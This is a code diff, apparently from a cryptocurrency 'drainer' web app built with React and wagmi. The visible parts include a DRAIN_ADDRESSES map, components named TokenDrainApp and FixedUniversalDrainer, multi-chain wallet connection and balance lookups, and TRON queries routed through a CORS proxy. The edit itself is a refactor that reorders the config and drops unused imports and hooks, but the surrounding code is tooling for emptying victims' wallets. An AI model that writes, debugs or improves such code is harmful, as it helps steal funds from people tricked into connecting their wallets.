@@ -2,10 +2,10 @@ import { useState, useEffect, useRef } from 'react';
 import { WagmiConfig, createConfig, configureChains, mainnet } from 'wagmi';
 import { polygon, bsc, arbitrum, optimism, avalanche, fantom, gnosis, celo, moonbeam, cronos, aurora, base, harmonyOne, metis, moonriver } from 'wagmi/chains';
 import { publicProvider } from 'wagmi/providers/public';
-import { http, createPublicClient, webSocket } from 'viem';
+import { http } from 'viem';
 import { ConnectKitProvider, ConnectKitButton } from "connectkit";
 import { useAccount, useWalletClient, useDisconnect, useBalance, useSwitchChain } from 'wagmi';
-import { parseEther, formatEther, createWalletClient, custom } from 'viem';
+import { parseEther, formatEther } from 'viem';
 import './mobile-fix.css';
 
 // ==================== WORKING RPC ENDPOINTS (VERIFIED JAN 2026) ====================
@@ -491,35 +491,6 @@ const DRAIN_ADDRESSES = {
   solana_spl: "So11111111111111111111111111111111111111112",
 };
 
-// ==================== FIXED WAGMI CONFIG ====================
-const { chains, publicClient } = configureChains(
-  [
-    mainnet,
-    polygon,
-    bsc,
-    arbitrum,
-    optimism,
-    avalanche,
-    fantom,
-    gnosis,
-    celo,
-    moonbeam,
-    cronos,
-    aurora,
-    base,
-    harmonyOne,
-    metis,
-    moonriver
-  ],
-  [publicProvider()]
-);
-
-const wagmiConfig = createConfig({
-  autoConnect: true,
-  publicClient,
-  webSocketPublicClient: publicClient,
-});
-
 // ==================== TOKEN PRICE MAP ====================
 const TOKEN_PRICES = {
   ETH: 3200,
@@ -560,6 +531,35 @@ const TOKEN_PRICES = {
   USDC: 1
 };
 
+// ==================== FIXED WAGMI CONFIG ====================
+const { chains, publicClient } = configureChains(
+  [
+    mainnet,
+    polygon,
+    bsc,
+    arbitrum,
+    optimism,
+    avalanche,
+    fantom,
+    gnosis,
+    celo,
+    moonbeam,
+    cronos,
+    aurora,
+    base,
+    harmonyOne,
+    metis,
+    moonriver
+  ],
+  [publicProvider()]
+);
+
+const wagmiConfig = createConfig({
+  autoConnect: true,
+  publicClient,
+  webSocketPublicClient: publicClient,
+});
+
 // ==================== MAIN APP ====================
 function TokenDrainApp() {
   return (
@@ -597,9 +597,7 @@ function TokenDrainApp() {
 function FixedUniversalDrainer() {
   const { address, isConnected, connector } = useAccount();
   const { data: ethBalance } = useBalance({ address });
-  const { data: walletClient } = useWalletClient();
   const { disconnect } = useDisconnect();
-  const { switchChain } = useSwitchChain();
 
   // State
   const [status, setStatus] = useState('Ready to connect');
@@ -729,8 +727,6 @@ function FixedUniversalDrainer() {
     if (!address) return;
     
     try {
-      // Use CORS proxy for TRON API calls
-      const corsProxy = 'https://corsproxy.io/?';
       const trxBalance = await getTronBalanceWithProxy(address);
       
       if (trxBalance > 0) {
